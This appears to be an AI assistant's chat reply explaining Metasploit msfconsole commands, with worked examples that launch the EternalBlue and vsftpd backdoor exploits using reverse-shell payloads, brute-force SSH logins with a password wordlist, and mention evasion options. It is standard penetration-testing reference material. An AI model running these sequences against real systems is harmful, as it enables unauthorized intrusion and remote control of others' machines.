You've listed the core `msfconsole` commands! Let me expand on each and provide more details:

## **Core Commands Deep Dive**

### **1. `help` - Command Reference**
```bash
help                    # Shows ALL commands
help search             # Detailed help for 'search'
help set                # Help for setting variables
help db_import          # Database import help

# Categories in help:
Core Commands          # Essential msfconsole commands
Module Commands        # Module-related commands
Job Commands           # Background job management
Resource Script Commands
Database Backend Commands
Credentials Backend Commands
Developer Commands     # For module development
```

### **2. `search` - Module Discovery**
```bash
# Basic search
search eternalblue
search smb

# Advanced search filters:
search type:exploit platform:windows
search type:auxiliary name:scanner port:445
search type:post platform:linux
search cve:2017-0144
search author:hdm
search path:ftp

# Multiple terms
search type:exploit platform:windows smb

# Save search results
search smb -o /tmp/smb_modules.txt
```

### **3. `info` - Module Details**
```bash
# Get detailed module info
info exploit/windows/smb/ms17_010_eternalblue

# Shows:
- Description
- Available targets
- Module options
- References (CVE, BID, etc.)
- Authors
- Disclosure date
- Platform/Arch requirements
```

### **4. `show` Commands - Module Information**

#### **`show options`**
```bash
use exploit/windows/smb/ms17_010_eternalblue
show options

# Color coding:
- Red: Required options
- Blue: Current settings
- White: Optional settings
```

#### **`show advanced`**
```bash
show advanced

# Shows advanced/tuning options:
- Evasion techniques
- Timing options
- Connection settings
- Exploit reliability options
```

#### **`show missing`**
```bash
show missing          # Shows only unset required options
```

#### **`show payloads`**
```bash
# Shows compatible payloads for current module
use exploit/windows/smb/ms17_010_eternalblue
show payloads

# Filter by architecture
show payloads arch:x64
```

#### **`show targets`**
```bash
# Shows vulnerable software versions
show targets

# Example output:
0   Automatic Targeting
1   Windows 7
2   Windows Server 2008 R2
```

### **5. Module Navigation Commands**
```bash
use <module>          # Load a module
back                  # Exit current module
previous              # Go to previously used module
next                  # Go to next module in history
```

### **6. `show` - Global Information**
```bash
show exploits         # List ALL exploit modules
show auxiliary        # List ALL auxiliary modules
show post             # List ALL post-exploitation modules
show encoders         # List ALL encoders
show nops             # List ALL NOP generators
show evasion          # List ALL evasion modules
show plugins          # List loaded plugins
```

## **Practical Examples**

### **Example 1: Finding and Using a Module**
```bash
# 1. Search for FTP modules
search ftp type:exploit

# 2. Get info on a specific module
info exploit/unix/ftp/vsftpd_234_backdoor

# 3. Use the module
use exploit/unix/ftp/vsftpd_234_backdoor

# 4. Show options
show options

# 5. Set required values
set RHOSTS 192.168.1.100
set RPORT 21

# 6. Show payload options
show payloads

# 7. Set payload
set payload cmd/unix/reverse

# 8. Set payload options
set LHOST 192.168.1.10
set LPORT 4444

# 9. Run the exploit
exploit
```

### **Example 2: Working with Multiple Modules**
```bash
# 1. Use first module
use auxiliary/scanner/ssh/ssh_login

# 2. Set options
set RHOSTS 192.168.1.0/24
set USERPASS_FILE /usr/share/wordlists/rockyou.txt

# 3. Go back, use different module
back
use auxiliary/scanner/portscan/tcp

# 4. Use previous to return
previous  # Goes back to ssh_login module
```

### **Example 3: Database Integration**
```bash
# 1. Check database status
db_status

# 2. Search and use modules that work with database
search type:auxiliary name:db_

# 3. Import scan results
db_import /path/to/nmap_scan.xml

# 4. Show imported hosts
hosts

# 5. Search for exploits for discovered services
services -p 445 -R  # Show hosts with port 445
search smb type:exploit
```

## **Useful Shortcuts & Tips**

### **Tab Completion**
```bash
# Module paths
use exploit/win<TAB><TAB>

# Options
set R<TAB><TAB>

# File paths
set USERPASS_FILE /usr/share/<TAB><TAB>
```

### **Command History**
```bash
history                # Show command history
!5                     # Run command #5 from history
!search                # Run last search command
```

### **Workspace Management**
```bash
workspace              # List workspaces
workspace client_a     # Switch to client_a workspace
workspace -a client_b  # Add new workspace
workspace -d client_b  # Delete workspace
```

### **Resource Files**
```bash
# Create automation scripts
cat > scan.rc << EOF
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run
EOF

# Run the script
resource scan.rc
```

### **Module Development Commands**
```bash
reload                 # Reload current module
check                  # Test if target is vulnerable
edit                   # Edit current module in $EDITOR
```

## **Common Workflow with Your Commands**

```bash
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > info
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.105
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options  # Now shows payload options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced
msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

## **Quick Reference Card**
```bash
# MODULE DISCOVERY
search [type:] [platform:] [name:] [author:] [cve:]
info <module>

# MODULE CONFIGURATION
show options/advanced/payloads/targets/missing
set <option> <value>
setg <option> <value>  # Global setting

# MODULE EXECUTION
run        # For auxiliary modules
exploit    # For exploit modules
check      # Vulnerability check

# NAVIGATION
use <module>
back
previous/next

# DATABASE
hosts
services
creds
loot
vulns
```

## **Pro Tips**
1. **Use `setg` for settings you use often** (LHOST, workspace, etc.)
2. **Always check `show options` after setting payload**
3. **Use `search -h` for advanced search syntax**
4. **Combine `search` with `-o` to save results**
5. **Use workspace to separate client data**
6. **Check `show advanced` for evasion/tuning options**

Would you like a practical walkthrough of using these commands against a specific target or scenario?
